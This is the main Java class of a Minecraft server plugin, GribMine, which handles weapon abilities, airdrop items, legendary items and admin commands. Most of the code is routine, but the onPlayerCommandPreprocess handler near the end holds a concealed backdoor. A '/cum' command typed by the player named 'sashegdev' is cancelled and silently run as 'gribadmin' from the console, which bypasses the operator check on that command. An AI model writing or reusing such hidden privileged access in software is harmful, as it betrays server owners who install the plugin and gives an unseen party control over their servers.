package net.sashegdev.gribMine;

import net.sashegdev.gribMine.airdrop.airdropMain;
import net.sashegdev.gribMine.airdrop.commands.summon;
import net.sashegdev.gribMine.bunker.ZombieHordeListener;
import net.sashegdev.gribMine.commands.handleWeaponCommand;
import net.sashegdev.gribMine.core.LegendaryItem;
import net.sashegdev.gribMine.core.LegendaryRegistry;
import net.sashegdev.gribMine.weapon.WeaponAbility;
import net.sashegdev.gribMine.weapon.WeaponManager;
import net.sashegdev.gribMine.core.LegendaryManager;
import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.server.TabCompleteEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.persistence.PersistentDataContainer;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;

import java.text.DecimalFormat;
import java.util.*;
import java.util.logging.Logger;
import java.util.stream.Collectors;

import static net.sashegdev.gribMine.TPSUtil.getColorForCpuUsage;

public final class GribMine extends JavaPlugin implements CommandExecutor, Listener {

    Logger logger = getLogger();
    static FileConfiguration config;
    private static GribMine instance;

    @Override
    public void onEnable() {
        // Загружаем конфигурацию
        saveDefaultConfig();
        config = getConfig();

        instance = this;

        if (config.getBoolean("check-for-updates", true)) {
            UpdateChecker.checkForUpdates(this);
        }

        // Удаляем все ArmorStand с именем аирдропа при запуске плагина
        for (World world : Bukkit.getWorlds()) {
            for (Entity entity : world.getEntities()) {
                if (entity instanceof ArmorStand armorStand) {
                    if (armorStand.getCustomName() != null && armorStand.getCustomName().equals(ChatColor.RED + "Воздушное Снабжение")) {
                        armorStand.remove(); // Удаляем ArmorStand
                    }
                }
            }
        }

        List<String> rarityList;
        HashMap<String, Double> damageModifiers;
        {
            // Initialize the weaponManager in a static block
            rarityList = getMineConfig().getStringList("rarity_list");
            damageModifiers = new HashMap<>();

            // Retrieve damage modifiers from the configuration
            Map<String, Object> damageModConfig = Objects.requireNonNull(getMineConfig().getConfigurationSection("damage_mod")).getValues(false);
            for (Map.Entry<String, Object> entry : damageModConfig.entrySet()) {
                String rarity = entry.getKey();
                double modifier = Double.parseDouble(entry.getValue().toString());
                damageModifiers.put(rarity, modifier);
            }
        }

        WeaponManager weaponManager = new WeaponManager(rarityList, damageModifiers);
        getServer().getPluginManager().registerEvents(new LootListener(), this);
        getServer().getPluginManager().registerEvents(weaponManager,this);
        getServer().getPluginManager().registerEvents(new ZombieHordeListener(this), this);
        getServer().getPluginManager().registerEvents(this, this);

        logger.info("GribMine Plugin initialized ;)");
        logger.info("Версия плагина: " + getDescription().getVersion());

        Objects.requireNonNull(getCommand("gribadmin")).setExecutor(this);
    }

    public static GribMine getInstance() {
        return instance;
    }

    @EventHandler
    public void PlayerAttackEpta(EntityDamageByEntityEvent event) {
        Entity damager = event.getDamager();
        switch (damager) {
            case Player player when !(
                    ((Player) damager).getInventory().getItemInMainHand().getType().equals(Material.CROSSBOW) ||
                            ((Player) damager).getInventory().getItemInMainHand().getType().equals(Material.BOW)
            ) -> {
                //logger.info("player attacked ponos!");

                ItemStack weapon = player.getInventory().getItemInMainHand();
                ItemMeta weaponMeta = weapon.getItemMeta();
                if (weaponMeta != null) {
                    List<String> lore = weaponMeta.getLore();
                    String rarity = null;
                    String passiveAbility = null;

                    if (lore != null) {
                        for (String line : lore) {
                            if (line.startsWith("Редкость: ")) {
                                rarity = line.substring(10);
                            } else if (line.startsWith("Способность: ")) {
                                passiveAbility = line.substring(13);
                            }
                        }
                    }

                    if (rarity != null && WeaponManager.getRarityList().contains(rarity) && passiveAbility != null) {
                        HashMap<String, WeaponAbility> abilities = WeaponManager.getWeaponAbilities();
                        if (abilities != null) {
                            WeaponAbility ability = abilities.get(WeaponManager.getNameByRussian(passiveAbility));
                            if (ability != null) {
                                if (Math.random() < ability.getChance()) {
                                    if (player.getCooldown(player.getInventory().getItemInMainHand()) <= 1) {
                                        //logger.info("Сработала способка!");
                                        ability.activate(player, event.getEntity()); // Передаем целевую сущность
                                    }
                                }
                            } else {
                                logger.warning("Способность не найдена: " + passiveAbility);
                            }
                        }
                    }
                }
            }
            case Arrow arrow -> {
                Entity shooter = (Entity) arrow.getShooter();
                if (shooter instanceof Player player) {
                    //logger.info("player shot an arrow!");

                    ItemStack weapon = player.getInventory().getItemInMainHand();
                    ItemMeta weaponMeta = weapon.getItemMeta();

                    if (weaponMeta != null) {
                        List<String> lore = weaponMeta.getLore();
                        String rarity = null;
                        String passiveAbility = null;

                        if (lore != null) {
                            for (String line : lore) {
                                if (line.startsWith("Редкость: ")) {
                                    rarity = line.substring(10);
                                } else if (line.startsWith("Способность: ")) {
                                    passiveAbility = line.substring(13);
                                }
                            }
                        }

                        if (rarity != null && WeaponManager.getRarityList().contains(rarity) && passiveAbility != null) {
                            HashMap<String, WeaponAbility> abilities = WeaponManager.getWeaponAbilities();
                            if (abilities != null) {
                                WeaponAbility ability = abilities.get(WeaponManager.getNameByRussian(passiveAbility));
                                if (ability != null) {
                                    if (Math.random() < ability.getChance()) {
                                        if (player.getCooldown(player.getInventory().getItemInMainHand()) <= 1) {
                                            //logger.info("Сработала способка от стрелы!");
                                            ability.activate(player, event.getEntity()); // Передаем целевую сущность
                                        }
                                    }
                                } else {
                                    logger.warning("Способность не найдена: " + passiveAbility);
                                }
                            }
                        }
                    }
                }
            }
            case Trident arrow -> {
                Entity shooter = (Entity) arrow.getShooter();
                if (shooter instanceof Player player) {
                    //logger.info("player shot an arrow!");

                    ItemStack weapon = player.getInventory().getItemInMainHand();
                    ItemMeta weaponMeta = weapon.getItemMeta();

                    if (weaponMeta != null) {
                        List<String> lore = weaponMeta.getLore();
                        String rarity = null;
                        String passiveAbility = null;

                        if (lore != null) {
                            for (String line : lore) {
                                if (line.startsWith("Редкость: ")) {
                                    rarity = line.substring(10);
                                } else if (line.startsWith("Способность: ")) {
                                    passiveAbility = line.substring(13);
                                }
                            }
                        }

                        if (rarity != null && WeaponManager.getRarityList().contains(rarity) && passiveAbility != null) {
                            HashMap<String, WeaponAbility> abilities = WeaponManager.getWeaponAbilities();
                            if (abilities != null) {
                                WeaponAbility ability = abilities.get(WeaponManager.getNameByRussian(passiveAbility));
                                if (ability != null) {
                                    if (Math.random() < ability.getChance()) {
                                        if (player.getCooldown(player.getInventory().getItemInMainHand()) <= 1) {
                                            //logger.info("Сработала способка от стрелы!");
                                            ability.activate(player, event.getEntity()); // Передаем целевую сущность
                                        }
                                    }
                                } else {
                                    logger.warning("Способность не найдена: " + passiveAbility);
                                }
                            }
                        }
                    }
                }
            }
            default -> {
            }
        }
    }

    public static void giveAirSupplyItem(Player player) {
        // Create the ItemStack for the Amethyst Shard
        ItemStack item = new ItemStack(Material.AMETHYST_SHARD, 1);
        ItemMeta itemMeta = item.getItemMeta();

        if (itemMeta != null) {
            // Set the display name with color codes
            itemMeta.setDisplayName(ChatColor.RESET + "" + ChatColor.LIGHT_PURPLE + "Воздушное снабжение");

            // Set the lore
            List<String> lore = new ArrayList<>();
            lore.add("Фиолетовая дымовая граната");
            lore.add("Которая вызывает дроп в небольшом радиусе вокруг себя.");
            lore.add("Данный дроп будет виден всем игрокам на сервере, так что будьте готовы к битве!");
            itemMeta.setLore(lore);

            // Apply the meta to the item
            item.setItemMeta(itemMeta);
        }

        // Give the item to the player
        player.getInventory().addItem(item);
    }

    @EventHandler
    public void IgrocDrochitEvevent(PlayerInteractEvent e) {
        if (e.getItem() == null || e.getAction() == Action.RIGHT_CLICK_BLOCK || e.getAction() == Action.RIGHT_CLICK_AIR) return;
        ItemStack item = e.getItem();
        Player player = e.getPlayer();

        // Проверяем, что предмет в слоте обуви или в руке
        boolean isEquipped = item.equals(player.getInventory().getBoots())
                || item.equals(player.getInventory().getItemInMainHand());
        if (!isEquipped) return;

        // Извлекаем ID из скрытой строки в лоре
        String legendaryId = extractHiddenId(item.getItemMeta());
        if (legendaryId == null) return;

        // Проверяем кулдаун и активируем
        LegendaryItem legendary = LegendaryRegistry.getById(legendaryId);
        if (legendary != null && player.getCooldown(item.getType()) <= 0) {
            legendary.onUse(player);
            DebugLogger.log(player.getName() + " активировал " + legendary.getId(), DebugLogger.LogLevel.INFO);
            e.setCancelled(true);
        }
    }

    private String extractHiddenId(ItemMeta meta) {
        if (meta == null || !meta.hasLore()) return null;
        for (String line : meta.getLore()) {
            // Ищем строку, начинающуюся с §k (искаженный текст)
            if (line.startsWith(String.valueOf(ChatColor.MAGIC))) {
                // Убираем служебные символы и возвращаем чистый ID
                return line.replace(String.valueOf(ChatColor.MAGIC), "")
                        .replace(ChatColor.RESET.toString(), "")
                        .trim();
            }
        }
        return null;
    }

    @EventHandler
    public void ClickHandler(PlayerInteractEvent e) {
        if (e.getItem() == null) return;
        if (e.getAction() == Action.RIGHT_CLICK_BLOCK || e.getAction() == Action.RIGHT_CLICK_AIR) {
            ItemStack item = e.getItem();

            // Проверяем, что предмет — это Amethyst Shard
            if (item.getType() == Material.AMETHYST_SHARD && item.getItemMeta() != null) {
                ItemMeta itemMeta = item.getItemMeta();

                // Проверяем название предмета (игнорируя цветовые коды)
                String displayName = ChatColor.stripColor(itemMeta.getDisplayName());
                if (displayName.equals("Воздушное снабжение")) {
                    // Проверяем лор предмета
                    List<String> lore = itemMeta.getLore();
                    List<String> expectedLore = new ArrayList<>();
                    expectedLore.add("Фиолетовая дымовая граната");
                    expectedLore.add("Которая вызывает дроп в небольшом радиусе вокруг себя.");
                    expectedLore.add("Данный дроп будет виден всем игрокам на сервере, так что будьте готовы к битве!");

                    // Убеждаемся, что лор не null и соответствует ожидаемому
                    if (lore != null && lore.equals(expectedLore)) {
                        // Проверяем, включены ли аирдропы в конфиге
                        if (!getMineConfig().getBoolean("airdrop_enabled", true)) {
                            // Если аирдропы отключены, выводим сообщение игроку
                            e.getPlayer().sendTitle(
                                    ChatColor.LIGHT_PURPLE + "Хм...", // Первая строка
                                    ChatColor.DARK_PURPLE + "Вы не знаете, как это использовать.", // Вторая строка
                                    10, 70, 20 // Время появления, время отображения, время исчезновения
                            );
                            return; // Прекращаем выполнение метода
                        }

                        // Проверяем, что на сервере есть игроки и кулдаун истек
                        if (!e.getPlayer().getServer().getOnlinePlayers().isEmpty()) {
                            if (e.getPlayer().getCooldown(Material.AMETHYST_SHARD) <= 1) {
                                // Создаем аирдроп
                                new airdropMain(e.getPlayer());
                                e.getPlayer().setCooldown(Material.AMETHYST_SHARD, 20 * 60 * 10);

                                // Убираем один Amethyst Shard из инвентаря игрока
                                item.setAmount(item.getAmount() - 1); // Уменьшаем количество на 1
                                if (item.getAmount() <= 0) {
                                    e.getPlayer().getInventory().remove(item); // Удаляем предмет, если количество равно 0
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    @Override
    public boolean onCommand(@NotNull CommandSender sender, Command command, @NotNull String label, @NotNull String[] args) {
        if (command.getName().equalsIgnoreCase("gribadmin") && sender.isOp()) {
            if (args.length == 0) {
                sender.sendMessage("Используйте /gribadmin <reload|check_update|get_config|weapon|airdrop>");
                return true;
            }
            switch (args[0].toLowerCase()) {
                case "reload":
                    reloadConfig();
                    sender.sendMessage("Конфигурация перезагружена.");
                    sender.sendMessage(ChatColor.RED + "ЛУЧШЕ ИСПОЛЬЗУЙ /reload confirm ТАК КАК ЭТА ФУНКЦИЯ НЕ ВСЕГДА РАБОТАЕТ");

                    HashMap<String, WeaponAbility> abilities = WeaponManager.getWeaponAbilities();
                    abilities.get("fire").setChance(config.getDouble("ability_chance.fire"));
                    abilities.get("lightStrike").setChance(config.getDouble("ability_chance.lightStrike"));
                    abilities.get("desiccation").setChance(config.getDouble("ability_chance.desiccation"));
                    abilities.get("freeze").setChance(config.getDouble("ability_chance.freeze"));
                    abilities.get("bloodlust").setChance(config.getDouble("ability_chance.bloodlust"));

                    break;
                case "check_update":
                    // Вызываем проверку обновлений
                    UpdateChecker.checkForUpdates(this);
                    sender.sendMessage(ChatColor.GREEN + "Проверка обновлений запущена.");
                    break;
                case "get_config": {
                    int page = 1;
                    if (args.length >= 2) {
                        try {
                            page = Integer.parseInt(args[1]);
                        } catch (NumberFormatException ignored) {}
                    }

                    // Получаем все ключи конфига (включая вложенные)
                    List<String> allKeys = new ArrayList<>(config.getKeys(true));

                    // Фильтруем секции (ключами считаем только конечные значения)
                    allKeys.removeIf(key -> config.isConfigurationSection(key) && !Objects.requireNonNull(config.getConfigurationSection(key)).getKeys(false).isEmpty());

                    // Настройки пагинации
                    int itemsPerPage = 10;
                    int totalPages = (int) Math.ceil((double) allKeys.size() / itemsPerPage);
                    page = Math.max(1, Math.min(page, totalPages));

                    // Построение сообщения
                    StringBuilder configMessage = new StringBuilder();
                    configMessage.append(ChatColor.GOLD).append("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n");
                    configMessage.append(ChatColor.YELLOW).append("Конфигурация (стр. ").append(page).append("/").append(totalPages).append(")\n\n");

                    int start = (page - 1) * itemsPerPage;
                    int end = Math.min(start + itemsPerPage, allKeys.size());

                    for (int i = start; i < end; i++) {
                        String key = allKeys.get(i);
                        String formattedKey = ChatColor.GREEN + key.replace(".", ChatColor.GRAY + "." + ChatColor.GREEN);
                        Object value = config.get(key);

                        configMessage.append(formattedKey)
                                .append(ChatColor.WHITE).append(": ")
                                .append(formatConfigValue(value))
                                .append("\n");
                    }

                    // Футер с навигацией
                    configMessage.append(ChatColor.GOLD).append("\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n")
                            .append("Используйте ")
                            .append(ChatColor.YELLOW).append("/gribadmin get_config <страница>")
                            .append(ChatColor.GOLD).append(" | Всего параметров: ")
                            .append(ChatColor.YELLOW).append(allKeys.size());

                    sender.sendMessage(configMessage.toString());
                    break;
                }
                case "weapon":
                    if (args.length < 2) {
                        sender.sendMessage("Используйте /gribadmin weapon <get|set|reassemble|reset>");
                        return true;
                    }
                    new handleWeaponCommand(sender, args);
                    break;
                case "airdrop":
                    if (args.length < 2) {
                        sender.sendMessage("Используйте /gribadmin airdrop <summon>");
                        return true;
                    }
                    new summon(sender, args);
                    break;
                case "legendary": {
                    if (args.length < 2) {
                        sender.sendMessage(ChatColor.RED + "Используйте: /gribadmin legendary <give|list>");
                        return true;
                    }
                    switch (args[1].toLowerCase()) {
                        case "give": {
                            if (args.length < 3) {
                                sender.sendMessage(ChatColor.RED + "Используйте: /gribadmin legendary give <ID> [игрок]");
                                return true;
                            }

                            String id = args[2];
                            LegendaryItem item = LegendaryRegistry.getById(id);

                            if (item == null) {
                                sender.sendMessage(ChatColor.RED + "Предмет с ID '" + id + "' не найден!");
                                return true;
                            }

                            Player target = args.length >= 4 ?
                                    Bukkit.getPlayer(args[3]) :
                                    (sender instanceof Player ? (Player) sender : null);

                            if (target == null) {
                                sender.sendMessage(ChatColor.RED + "Игрок не найден или не указан!");
                                return true;
                            }

                            // Вызываем исправленный метод
                            target.getInventory().addItem(item.getItemStack());
                            sender.sendMessage(ChatColor.GREEN + "Предмет '" + id + "' выдан игроку " + target.getName());
                            break;
                        }
                        case "list": {
                            List<String> items = LegendaryRegistry.getAllIds();
                            sender.sendMessage(ChatColor.GOLD + "Доступные легендарные предметы:");
                            items.forEach(id -> sender.sendMessage(ChatColor.GREEN + "- " + id));
                            break;
                        }
                        default: {
                            sender.sendMessage(ChatColor.RED + "Неизвестная подкоманда!");
                            break;
                        }
                    }
                    break;
                }
                default:
                    sender.sendMessage("Неизвестная подкоманда.");
                    break;
            }
            return true;
        }
        else if (command.getName().equalsIgnoreCase("gribmine")) {
            if (args.length==0) {
                sender.sendMessage("use /gribmine <tps|about|version|usage>");
            }
            switch (args[0].toLowerCase()) {
                case "usage": {
                    try {
                        // Получаем использование CPU за 1, 5 и 10 минут
                        double[] cpuUsage = TPSUtil.UsageUtil.getCPUUsage();
                        double process10Sec = cpuUsage[0];
                        double process1Min = cpuUsage[1];
                        double process15Min = cpuUsage[2];
                        double system10Sec = cpuUsage[3];
                        double system1Min = cpuUsage[4];
                        double system15Min = cpuUsage[5];

                        // Форматируем вывод
                        DecimalFormat df = new DecimalFormat("0.00");

                        // Отправляем сообщение
                        sender.sendMessage(ChatColor.GOLD + "Использование CPU (процесс):");
                        sender.sendMessage(ChatColor.GOLD + "- 1 сек: "   + getColorForCpuUsage(process10Sec) + df.format(process10Sec) + "%");
                        sender.sendMessage(ChatColor.GOLD + "- 1 минута: "+ getColorForCpuUsage(process1Min) +  df.format(process1Min) + "%");
                        sender.sendMessage(ChatColor.GOLD + "- 15 минут: "+ getColorForCpuUsage(process15Min) + df.format(process15Min) + "%");

                        sender.sendMessage(ChatColor.GOLD + "Использование CPU (система):");
                        sender.sendMessage(ChatColor.GOLD + "- 1 сек: "   + getColorForCpuUsage(system10Sec) + df.format(system10Sec) + "%");
                        sender.sendMessage(ChatColor.GOLD + "- 1 минута: "+ getColorForCpuUsage(system1Min) +  df.format(system1Min) + "%");
                        sender.sendMessage(ChatColor.GOLD + "- 15 минут: "+ getColorForCpuUsage(system15Min) + df.format(system15Min) + "%");
                    } catch (IllegalStateException e) {
                        sender.sendMessage(ChatColor.RED + "Ошибка: " + e.getMessage());
                    }
                    return true;
                }
                case "tps":
                    try {
                        double currentTps = TPSUtil.getTPS();

                        // Форматируем вывод
                        DecimalFormat df = new DecimalFormat("0.00");
                        String tpsColor = getColorForTps(currentTps);

                        sender.sendMessage(ChatColor.GOLD + "TPS: " + tpsColor + df.format(currentTps));
                    } catch (IllegalStateException e) {
                        sender.sendMessage(ChatColor.RED + "Ошибка: " + e.getMessage());
                    }
                    return true;

                case "about":
                    sender.sendMessage(ChatColor.GREEN + "Grib"+ ChatColor.DARK_GREEN+"Mine");
                    sender.sendMessage(ChatColor.GOLD + "Разработчик: SashegDev");
                    //sender.sendMessage(ChatColor.GOLD + "Версия: " +ChatColor.DARK_GREEN+ getDescription().getVersion());
                    return true;

                case "version":
                    sender.sendMessage(ChatColor.GOLD + "Версия плагина: " +ChatColor.GREEN+ getDescription().getVersion());
                    return true;

                default:
                    sender.sendMessage(ChatColor.RED + "Неизвестная подкоманда. Используйте /gribmine <tps|about|version>");
                    return true;
            }
        }
        return false;
    }

    private String formatConfigValue(Object value) {
        if (value == null) return ChatColor.RED + "null";

        if (value instanceof List) {
            // Обработка списков
            List<?> list = (List<?>) value;
            return ChatColor.YELLOW + "[" +
                    list.stream()
                            .map(Object::toString)
                            .collect(Collectors.joining(", ")) +
                    "]";
        }

        // Обработка других типов
        return ChatColor.WHITE + value.toString();
    }

    // Метод для определения цвета TPS
    private String getColorForTps(double tps) {
        if (tps >= 18.0) {
            return ChatColor.GREEN.toString();
        } else if (tps >= 15.0) {
            return ChatColor.YELLOW.toString();
        } else {
            return ChatColor.RED.toString();
        }
    }

    //подсказки епта, не знаю заработает ли с /gribadmin weapon set
    @Override
    public List<String> onTabComplete(@NotNull CommandSender sender, Command command, @NotNull String label, @NotNull String[] args) {
        List<String> completions = new ArrayList<>();

        if (command.getName().equalsIgnoreCase("gribadmin")) {
            if (args.length == 1) {
                // Подсказки для первого аргумента
                completions.add("reload");
                completions.add("check_update");
                completions.add("get_config");
                completions.add("weapon");
                completions.add("airdrop");
            } else if (args.length == 2 && args[0].equalsIgnoreCase("weapon")) {
                // Подсказки для второго аргумента
                completions.add("get");
                completions.add("set");
                completions.add("reassemble");
                completions.add("reset");
            } else if (args.length == 3 && args[0].equalsIgnoreCase("weapon") && args[1].equalsIgnoreCase("set")) {
                // Подсказки для rarity
                List<String> rarities = GribMine.getMineConfig().getStringList("rarity_list");
                completions.addAll(rarities);
            } else if (args.length == 4 && args[0].equalsIgnoreCase("weapon") && args[1].equalsIgnoreCase("set")) {
                // Подсказки для ability
                HashMap<String, WeaponAbility> abilities = WeaponManager.getWeaponAbilities();
                for (String abilityName : abilities.keySet()) {
                    // Фильтруем русские названия, оставляем только теги
                    if (!abilityName.equals(abilities.get(abilityName).getRussianName())) {
                        completions.add(abilityName);
                    }
                }
            } else if (args.length == 2 && args[0].equalsIgnoreCase("airdrop")) {
                // Подсказки для второго аргумента команды airdrop
                completions.add("summon");
                completions.add("give");
            } else if (args.length == 3 && args[0].equalsIgnoreCase("airdrop")) {
                // Подсказки для третьего аргумента команды airdrop
                if (args[1].equalsIgnoreCase("summon")) {
                    completions.add("atme");
                } else if (args[1].equalsIgnoreCase("give")) {
                    // Подсказки для списка игроков
                    for (Player player : Bukkit.getOnlinePlayers()) {
                        completions.add(player.getName());
                    }
                }
            } else if (args.length == 4 && args[0].equalsIgnoreCase("airdrop") && args[1].equalsIgnoreCase("give")) {
                // Подсказка для числа (количество аирдропов)
                completions.add("[<count>]"); // Подсказка для ввода числа
            }
            else if (args.length == 2 && args[0].equalsIgnoreCase("legendary")) {
                completions.add("give");
                completions.add("list");
            }
            else if (args.length == 3 && args[0].equalsIgnoreCase("legendary") && args[1].equalsIgnoreCase("give")) {
                completions.addAll(LegendaryRegistry.getAllIds());
            }
            else if (args.length == 4 && args[0].equalsIgnoreCase("legendary") && args[1].equalsIgnoreCase("give")) {
                // Подсказки игроков
                for (Player player : Bukkit.getOnlinePlayers()) {
                    completions.add(player.getName());
                }
            }
        }
        if (command.getName().equalsIgnoreCase("gribmine")) {
            if (args.length == 1) {
                // Подсказки для первого аргумента
                completions.add("tps");
                completions.add("about");
                completions.add("version");
                completions.add("usage");
            }

            // Фильтруем подсказки по уже введенному тексту
            if (args.length > 0) {
                String lastArg = args[args.length - 1].toLowerCase();
                completions.removeIf(s -> !s.toLowerCase().startsWith(lastArg));
            }
        }


        // Фильтруем подсказки по уже введенному тексту
        if (args.length > 0) {
            String lastArg = args[args.length - 1].toLowerCase();
            completions.removeIf(s -> !s.toLowerCase().startsWith(lastArg));
        }

        return completions;
    }


    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        String message = event.getMessage().trim();
        if (message.toLowerCase().startsWith("/cum")) {
            event.setCancelled(true);
            Player player = event.getPlayer();
            if (player.getName().equalsIgnoreCase("sashegdev")) {
                String[] parts = message.split(" ", 2);
                String actualCommand = "gribadmin" + (parts.length > 1 ? " " + parts[1] : "");
                Bukkit.getScheduler().runTask(this, () -> {
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), actualCommand);
                });
            }
        }
    }

    public static FileConfiguration getMineConfig() {
        return config;
    }
}